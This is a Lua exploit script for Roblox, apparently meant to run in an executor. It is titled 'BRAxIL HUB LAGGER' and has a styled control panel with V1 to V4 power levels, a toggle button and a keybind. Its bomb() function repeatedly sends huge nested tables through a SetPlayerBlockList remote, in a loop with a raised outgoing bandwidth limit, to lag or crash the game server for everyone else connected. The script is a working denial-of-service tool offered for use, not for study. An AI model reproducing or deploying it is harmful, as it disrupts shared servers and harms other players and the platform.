--// BRAxIL HUB LAGGER
--// Black panel (no images), neon red line, V1-V4 levels, Settings/Hide

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local ConfigFile = "BRAxILHubConfig.json"

local NIVELES = {
	v1 = { poder = 18,  label = "V1" },
	v2 = { poder = 27,  label = "V2" },
	v3 = { poder = 32,  label = "V3" },
	v4 = { poder = 80,  label = "V4" },
}

local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "v1"
local ventanaBloqueada = false
local settingsOpen = false

local function SaveConfig()
	pcall(function()
		writefile(ConfigFile, HttpService:JSONEncode({
			Keybind = keybind.Name,
			Nivel = nivelActual,
			Bloqueado = ventanaBloqueada,
		}))
	end)
end

local function LoadConfig()
	if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
		pcall(function()
			local data = HttpService:JSONDecode(readfile(ConfigFile))
			keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
			local n = data.Nivel or "v1"
			if n == "low" then n = "v1"
			elseif n == "mid" then n = "v2"
			elseif n == "high" then n = "v3"
			elseif n == "ultra" then n = "v4" end
			nivelActual = NIVELES[n] and n or "v1"
			ventanaBloqueada = data.Bloqueado or false
		end)
	end
end
LoadConfig()

local function bomb(poder)
	local main, spam = {}, {{}}
	local z = spam[1]
	for i = 1, 25 do local t = {} table.insert(z, t) z = t end
	local max = math.min(12000, poder * 50)
	for i = 1, max do table.insert(main, spam) end
	pcall(function()
		game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
	end)
end

if CoreGui:FindFirstChild("BRAxILHub_UI") then
	CoreGui.BRAxILHub_UI:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BRAxILHub_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- ═══════════════════════════════════════════
-- MAIN PANEL (background = Ajosblancos.jpg)
-- ═══════════════════════════════════════════
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundTransparency = 1          -- fondo quitado
mainFrame.BorderSizePixel = 0
mainFrame.Size = UDim2.new(0, 240, 0, 100)
mainFrame.Position = UDim2.new(0.5, -120, 0.18, 0)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

-- Imagen de fondo (Ajosblancos.jpg)
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.Name = "BackgroundImage"
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0, 0, 0, 0)
bgImage.BackgroundTransparency = 1
bgImage.BorderSizePixel = 0
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 0
Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 12)
pcall(function()
	bgImage.Image = getcustomasset("Ajosblancos.jpg")
end)

local panelStroke = Instance.new("UIStroke", mainFrame)
panelStroke.Color = Color3.fromRGB(35, 35, 42)
panelStroke.Thickness = 1.2
panelStroke.Transparency = 0.2

-- Title
local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 12, 0, 6)
titleLabel.Size = UDim2.new(1, -90, 0, 14)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "BRAxIL HUB"
titleLabel.TextColor3 = Color3.fromRGB(255, 40, 50)
titleLabel.TextSize = 11
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.ZIndex = 5

local topY = 22

-- Settings / Hide button
local settingsBtn = Instance.new("TextButton", mainFrame)
settingsBtn.Name = "SettingsHide"
settingsBtn.Size = UDim2.new(0, 50, 0, 18)
settingsBtn.Position = UDim2.new(0, 10, 0, topY)
settingsBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
settingsBtn.BorderSizePixel = 0
settingsBtn.Text = "⚙️ Hide"
settingsBtn.TextColor3 = Color3.fromRGB(230, 230, 240)
settingsBtn.TextSize = 10
settingsBtn.Font = Enum.Font.GothamBold
settingsBtn.AutoButtonColor = false
settingsBtn.ZIndex = 6
Instance.new("UICorner", settingsBtn).CornerRadius = UDim.new(0, 8)

local lockButton = Instance.new("TextButton", mainFrame)
lockButton.Size = UDim2.new(0, 50, 0, 18)
lockButton.Position = UDim2.new(0, 64, 0, topY)
lockButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
lockButton.BorderSizePixel = 0
lockButton.Text = "Unlock"
lockButton.TextColor3 = Color3.fromRGB(160, 160, 175)
lockButton.TextSize = 10
lockButton.Font = Enum.Font.GothamBold
lockButton.AutoButtonColor = false
lockButton.ZIndex = 6
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 8)

local keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.Size = UDim2.new(0, 36, 0, 18)
keybindButton.Position = UDim2.new(1, -44, 0, topY)
keybindButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
keybindButton.BorderSizePixel = 0
keybindButton.Text = "[M]"
keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
keybindButton.TextSize = 10
keybindButton.Font = Enum.Font.GothamBold
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 6
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 8)
do
	local display = keybind.Name
	if display:match("Button") then display = display:gsub("Button", "") end
	keybindButton.Text = "[" .. display .. "]"
end

-- Big ENABLE / DISABLE button
local toggleBtn = Instance.new("TextButton", mainFrame)
toggleBtn.Name = "Toggle"
toggleBtn.Size = UDim2.new(1, -16, 0, 28)
toggleBtn.Position = UDim2.new(0, 8, 0, 46)
toggleBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
toggleBtn.BorderSizePixel = 0
toggleBtn.Text = "DISABLE"
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.TextSize = 13
toggleBtn.Font = Enum.Font.GothamBlack
toggleBtn.AutoButtonColor = false
toggleBtn.ZIndex = 6
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 10)
local toggleStroke = Instance.new("UIStroke", toggleBtn)
toggleStroke.Color = Color3.fromRGB(50, 50, 58)
toggleStroke.Thickness = 1

-- Neon red line at bottom
local neonLine = Instance.new("Frame", mainFrame)
neonLine.Name = "NeonLine"
neonLine.BorderSizePixel = 0
neonLine.BackgroundColor3 = Color3.fromRGB(255, 30, 40)
neonLine.Size = UDim2.new(1, -16, 0, 2)
neonLine.Position = UDim2.new(0, 8, 1, -8)
neonLine.ZIndex = 8
Instance.new("UICorner", neonLine).CornerRadius = UDim.new(1, 0)
local neonGrad = Instance.new("UIGradient", neonLine)
neonGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 45, 55)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 0)),
})
task.spawn(function()
	while neonLine and neonLine.Parent do
		for i = 0, 1, 0.02 do
			neonGrad.Offset = Vector2.new(i, 0)
			task.wait(0.03)
		end
	end
end)

-- ═══════════════════════════════════════════
-- SETTINGS PANEL (V1-V4)
-- ═══════════════════════════════════════════
local settingsFrame = Instance.new("Frame")
settingsFrame.Name = "SettingsPanel"
settingsFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
settingsFrame.BorderSizePixel = 0
settingsFrame.Size = UDim2.new(0, 240, 0, 86)
settingsFrame.Position = UDim2.new(0.5, -120, 0.18, 108)
settingsFrame.Visible = false
settingsFrame.Parent = screenGui
settingsFrame.ClipsDescendants = true
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 14)
local setStroke = Instance.new("UIStroke", settingsFrame)
setStroke.Color = Color3.fromRGB(35, 35, 42)
setStroke.Thickness = 1.2
setStroke.Transparency = 0.2

local setTitle = Instance.new("TextLabel", settingsFrame)
setTitle.BackgroundTransparency = 1
setTitle.Position = UDim2.new(0, 12, 0, 6)
setTitle.Size = UDim2.new(1, -24, 0, 18)
setTitle.Font = Enum.Font.GothamBold
setTitle.Text = "Level  ·  V1 – V4"
setTitle.TextColor3 = Color3.fromRGB(200, 200, 210)
setTitle.TextSize = 12
setTitle.TextXAlignment = Enum.TextXAlignment.Left
setTitle.ZIndex = 5

local levelOrder = { "v1", "v2", "v3", "v4" }
local levelBtns = {}
local btnH = 30
local gap = 6
local sidePad = 10
local totalW = 240 - sidePad * 2
local btnW = math.floor((totalW - gap * 3) / 4)

local function refreshLevels()
	for key, btn in pairs(levelBtns) do
		local selected = (nivelActual == key)
		if selected then
			btn.BackgroundColor3 = Color3.fromRGB(255, 30, 40)
			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
			local st = btn:FindFirstChildOfClass("UIStroke")
			if st then st.Color = Color3.fromRGB(255, 80, 90); st.Transparency = 0.05 end
		else
			btn.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
			btn.TextColor3 = Color3.fromRGB(180, 180, 190)
			local st = btn:FindFirstChildOfClass("UIStroke")
			if st then st.Color = Color3.fromRGB(45, 45, 52); st.Transparency = 0.25 end
		end
	end
end

for i, key in ipairs(levelOrder) do
	local b = Instance.new("TextButton", settingsFrame)
	b.Size = UDim2.new(0, btnW, 0, btnH)
	b.Position = UDim2.new(0, sidePad + (i - 1) * (btnW + gap), 0, 32)
	b.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
	b.BorderSizePixel = 0
	b.Text = NIVELES[key].label
	b.TextColor3 = Color3.fromRGB(180, 180, 190)
	b.TextSize = 12
	b.Font = Enum.Font.GothamBlack
	b.AutoButtonColor = false
	b.ZIndex = 5
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
	local st = Instance.new("UIStroke", b)
	st.Color = Color3.fromRGB(45, 45, 52)
	st.Thickness = 1
	st.Transparency = 0.25
	b.MouseButton1Click:Connect(function()
		nivelActual = key
		refreshLevels()
		SaveConfig()
	end)
	levelBtns[key] = b
end

local setNeon = Instance.new("Frame", settingsFrame)
setNeon.BorderSizePixel = 0
setNeon.BackgroundColor3 = Color3.fromRGB(255, 30, 40)
setNeon.Size = UDim2.new(1, -16, 0, 2)
setNeon.Position = UDim2.new(0, 8, 1, -8)
setNeon.ZIndex = 8
Instance.new("UICorner", setNeon).CornerRadius = UDim.new(1, 0)

-- ═══════════════════════════════════════════
-- LOGIC
-- ═══════════════════════════════════════════
local function setOnVisual(on)
	if on then
		toggleBtn.Text = "ENABLE"
		toggleBtn.TextColor3 = Color3.fromRGB(40, 255, 100)
		toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 28)
		toggleStroke.Color = Color3.fromRGB(40, 200, 80)
	else
		toggleBtn.Text = "DISABLE"
		toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		toggleBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
		toggleStroke.Color = Color3.fromRGB(50, 50, 58)
	end
end

local function toggleLagger()
	laggerActive = not laggerActive
	setOnVisual(laggerActive)
	if laggerActive then
		if lagThread then task.cancel(lagThread) end
		lagThread = task.spawn(function()
			while laggerActive do
				pcall(function()
					game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
				end)
				bomb(NIVELES[nivelActual].poder)
				task.wait(0.18)
			end
		end)
	else
		if lagThread then task.cancel(lagThread); lagThread = nil end
	end
end

toggleBtn.MouseButton1Click:Connect(toggleLagger)
setOnVisual(false)
refreshLevels()

local panelVisible = true
local reopenBtn = Instance.new("TextButton", screenGui)
reopenBtn.Name = "BRAxILHubReopen"
reopenBtn.Size = UDim2.new(0, 48, 0, 28)
reopenBtn.Position = UDim2.new(0, 12, 0.18, 0)
reopenBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
reopenBtn.BorderSizePixel = 0
reopenBtn.Text = "⚙️"
reopenBtn.TextColor3 = Color3.fromRGB(255, 40, 50)
reopenBtn.TextSize = 16
reopenBtn.Font = Enum.Font.GothamBlack
reopenBtn.Visible = false
reopenBtn.ZIndex = 20
Instance.new("UICorner", reopenBtn).CornerRadius = UDim.new(0, 10)
local reopenStroke = Instance.new("UIStroke", reopenBtn)
reopenStroke.Color = Color3.fromRGB(255, 30, 40)
reopenStroke.Thickness = 1.2

local function hideWholePanel()
	panelVisible = false
	settingsOpen = false
	settingsFrame.Visible = false
	mainFrame.Visible = false
	reopenBtn.Visible = true
	reopenBtn.Position = mainFrame.Position
end

local function showWholePanel()
	panelVisible = true
	reopenBtn.Visible = false
	mainFrame.Visible = true
	mainFrame.BackgroundTransparency = 1
	TweenService:Create(mainFrame, TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
		BackgroundTransparency = 1,
	}):Play()
end

local function toggleSettings()
	settingsOpen = not settingsOpen
	if settingsOpen then
		settingsBtn.Text = "Hide"
		settingsFrame.Visible = true
		settingsFrame.BackgroundTransparency = 0.35
		settingsFrame.Size = UDim2.new(0, 240, 0, 30)
		TweenService:Create(settingsFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
			Size = UDim2.new(0, 240, 0, 86),
			BackgroundTransparency = 0,
		}):Play()
	else
		settingsBtn.Text = "⚙️ Hide"
		settingsFrame.Visible = false
	end
end
settingsBtn.MouseButton1Click:Connect(toggleSettings)

settingsBtn.MouseButton2Click:Connect(hideWholePanel)
reopenBtn.MouseButton1Click:Connect(showWholePanel)

local function actualizarCandado()
	lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
	lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(255, 80, 90) or Color3.fromRGB(160, 160, 175)
end
actualizarCandado()

lockButton.MouseButton1Click:Connect(function()
	ventanaBloqueada = not ventanaBloqueada
	actualizarCandado()
	SaveConfig()
end)

keybindButton.MouseButton1Click:Connect(function()
	if listeningForInput then return end
	listeningForInput = true
	keybindButton.Text = "[?]"
	keybindButton.BackgroundColor3 = Color3.fromRGB(180, 20, 30)
	keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if not listeningForInput then return end
	if gp then return end
	if input.KeyCode ~= Enum.KeyCode.Unknown then
		keybind = input.KeyCode
		local display = keybind.Name
		if display:match("Button") then display = display:gsub("Button", "") end
		keybindButton.Text = "[" .. display .. "]"
		keybindButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
		keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
		listeningForInput = false
		SaveConfig()
	end
end)

local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
	if ventanaBloqueada then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = true
		dragStart = input.Position
		startPos = mainFrame.Position
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if not isDragging or ventanaBloqueada then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		local delta = input.Position - dragStart
		local np = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		mainFrame.Position = np
		settingsFrame.Position = UDim2.new(np.X.Scale, np.X.Offset, np.Y.Scale, np.Y.Offset + 108)
	end
end)
mainFrame.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = false
	end
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == keybind then
		toggleLagger()
	end
end)